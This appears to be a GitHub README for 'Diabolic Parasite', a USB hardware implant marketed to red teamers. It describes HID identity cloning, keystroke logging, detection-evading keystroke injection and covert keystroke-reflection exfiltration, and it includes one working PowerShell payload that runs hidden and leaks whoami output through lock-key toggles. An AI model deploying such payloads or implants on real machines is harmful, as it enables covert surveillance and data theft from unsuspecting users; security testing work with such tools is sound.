# Diabolic Parasite 

## just like what happened with the [Diabolic Drive](https://www.crowdsupply.com/unit-72784/diabolic-drive) this repo will heavily be updated very soon and many features will be added to the firmware. Feel free to contact me with anything related to your Diabolic Parasite at Discord `@3amoonee`

<h1>:bangbang: Diabolic Parasite default access point credentials are:
  <br>Wi-Fi SSID: Diabolic Parasite</br>
  Password: diabolic_parasite 
  :bangbang:
</h1>

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/1b836990-f282-49b1-a445-4da1f05150ba" />

---

* [About](#about)
* [Why Diabolic Parasite ?](#why-diabolic-parasite-)
* [How Stealth can Diabolic Parasite go ?](#how-stealth-can-diabolic-parasite-go-)
* [Covert Keystroke Reflection](#covert-keystroke-reflection)
* [Usage](#usage)
* [Programming Options](#programming-options)

---

## About
Diabolic Parasite is a next-generation hardware implant designed for stealth, precision, and real-world impact. Built with red teamers, pentesters, and security researchers in mind, it delivers powerful offensive capabilities in an ultra-compact form factor. Whether you’re simulating insider threats or testing physical access scenarios, the Parasite integrates seamlessly into target systems — silently capturing, emulating, and injecting like a true covert operator. It’s not just a tool — it’s a hands-on platform for exploring advanced attack techniques while staying completely under the radar.

---

## Why Diabolic Parasite ?

Diabolic Parasite is designed to exploit real-world physical access opportunities. In the most common scenario, you simply unplug an existing HID device (such as a keyboard or mouse), connect it to the Parasite’s onboard female USB port, and plug the Parasite itself back into the original USB slot. It instantly clones the device’s full hardware identity, forwards all input in real time, and logs every keystroke — displaying it through the web UI — all while remaining invisible to the host system.

If the connected device isn’t an HID (for example, a printer or card reader), the Parasite automatically switches to Passthrough Mode (which can also be triggered manually to adapt to the situation), forwarding traffic untouched while staying completely dormant — as if it were just a set of wires. At any moment, you can wirelessly trigger a payload, causing the Parasite to impersonate the trusted device, inject keystrokes with full stealth, and then return to its dormant passthrough state — leaving no obvious trace of its presence.

<img width="2048" height="1536" alt="image" src="https://github.com/user-attachments/assets/de5ad3d7-9c45-4369-b141-3c728eb83f39" />

---

## How Stealth can Diabolic Parasite go ?

Diabolic Parasite is engineered with stealth as its top priority, making it exceptionally difficult to detect during real-world operations. Unlike traditional HID injectors, it doesn’t just present itself as a generic keyboard — it clones the full hardware identity of any attached HID device, including the PID, VID, manufacturer, and product strings. This deep-level spoofing ensures that the host system perceives it as the original trusted device, preventing any operating system prompts like “Installing new keyboard” or alerting security tools monitoring for new USB peripherals.

To further evade detection, keystroke injection is performed using randomized typing cadence (Configurable), mimicking natural human input and bypassing basic behavioral detection systems that flag bursts of artificial typing. Additionally, the Parasite includes keyboard layout bypassing using the ALT+Numpad method, allowing it to inject English characters reliably even when the host system is set to a different language or keyboard layout — ensuring payload consistency across international environments.

Together, these features make Diabolic Parasite an advanced stealth platform capable of operating undetected in high-security environments, ideal for red team engagements and advanced USB-based security assessments.

---

## Covert Keystroke Reflection

Diabolic Parasite takes keystroke reflection to the next level — transforming a once noisy, detectable method into a truly silent exfiltration channel. Unlike traditional techniques that rely on blinking LEDs or visible activity, the Parasite sits between the host and a real keyboard, intercepting and relaying communication without disruption. It covertly listens for encoded data sent by the host as simulated keystrokes — decoding it silently, without triggering LED indicators or system alerts. Because it perfectly mimics the original HID device, every interaction appears legitimate, allowing data to be exfiltrated in plain sight. It’s not just stealthy — it’s virtually invisible.



###  Example: Covert Keystroke Reflection Payload 

``` 
GUI r
DELAY 500
EXFIL
STRING powershell -w h "$o='';[char[]]((whoami).Trim())|%{[byte]$_}|%{for($i=7;$i-ge0;$i--){$o+=@('%{CAPSLOCK}','%{NUMLOCK}')[(($_-shr$i)-band1)]}};$o+='%{SCROLLLOCK}';Add-Type -A System.Windows.Forms;[Windows.Forms.SendKeys]::SendWait($o)"
ENTER
```




---
## Usage

Please refer to the **Help** button in the Diabolic Parasite's navigation menu.

## Programming Options

This section will be updated soon.
